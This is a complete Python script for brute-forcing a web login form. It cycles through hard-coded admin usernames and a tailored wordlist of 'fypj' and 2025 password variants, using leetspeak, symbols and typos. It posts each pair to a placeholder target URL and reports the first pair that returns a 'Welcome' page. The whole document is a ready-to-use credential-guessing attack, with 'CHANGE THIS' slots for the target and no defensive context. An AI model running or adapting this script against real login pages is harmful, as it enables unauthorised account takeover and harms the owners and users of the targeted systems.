import requests
from itertools import product

# Target config (replace these)
URL = "http://your.target/login"  # 🔁 CHANGE THIS
USERNAME_FIELD = "username"  # 🔁 CHANGE THIS
PASSWORD_FIELD = "password"  # 🔁 CHANGE THIS
SUCCESS_INDICATOR = "Welcome"  # 🔁 Adjust based on response on successful login

# Usernames
usernames = [
    "admin", "admin2025", "admin_fypj", "fypj_admin", "admin_fypj2025",
    "fypj2025admin", "fypjadmin", "admin.fypj", "fypj.admin", "admin_fyp"
]

# Passwords (compiled from all your categories)
passwords = [
    # Short year + symbols
    "fypj_25!", "fypj@25", "fypj#25", "fypj$25", "fypj%25", "fypj^25", "fypj&25", "fypj*25", "fypj-25", "fypj+25",
    "Fypj@25", "fYpj#25", "FYpj$25",

    # Full year
    "fypj@2025", "fypj#2025", "fypj_2025!", "fypj-2025", "fypj+2025", "fypj~2025", "fypj=2025", "fypj|2025",
    "Fypj@2025", "fYpj#2025", "FYpj_2025",

    # Symbol between
    "fypj@admin25", "fypj#admin2025", "fypj_admin@25", "fypj$admin$25", "fypj%admin%2025",
    "fypj@Admin25", "Fypj#admin2025",

    # Abbreviated
    "FY25_PJ", "PJ25!fy", "FY_PJ25", "fyPJ@25", "pjFY#25",
    "FY25_admin", "admin_PJ25",

    # Leet-speak
    "fypj@dm1n", "4dmin_fypj", "fypj_Adm!n", "fypj^4dm1n", "f!pj_admin",

    # Trailing symbols
    "fypj25!", "fypj2025#", "fypj_admin@", "admin25$", "fypj25_",
    "Fypj25!", "fYpj2025#",

    # Reverse/typo
    "nimda_jpyf", "25jpyf", "jpyf@25", "nimda2025",

    # Double symbols
    "fypj@@25", "fypj_25!!", "fypj##admin", "admin$$2025",

    # Typos
    "fypj_amdmin", "gypj_admin", "fypj_adm1n"
]


# Brute force logic
def try_login(session, username, password):
    data = {
        USERNAME_FIELD: username,
        PASSWORD_FIELD: password
    }
    response = session.post(URL, data=data)

    # Customize this check for your app
    if SUCCESS_INDICATOR in response.text:
        return True
    return False


def main():
    session = requests.Session()
    total_attempts = len(usernames) * len(passwords)
    attempt_count = 0

    for username, password in product(usernames, passwords):
        attempt_count += 1
        print(f"Trying {username}:{password} ({attempt_count}/{total_attempts})")

        try:
            if try_login(session, username, password):
                print(f"[SUCCESS] Username: {username} | Password: {password}")
                return
        except Exception as e:
            print(f"[ERROR] {e}")

    print("Brute force complete. No credentials worked.")


if __name__ == "__main__":
    main()
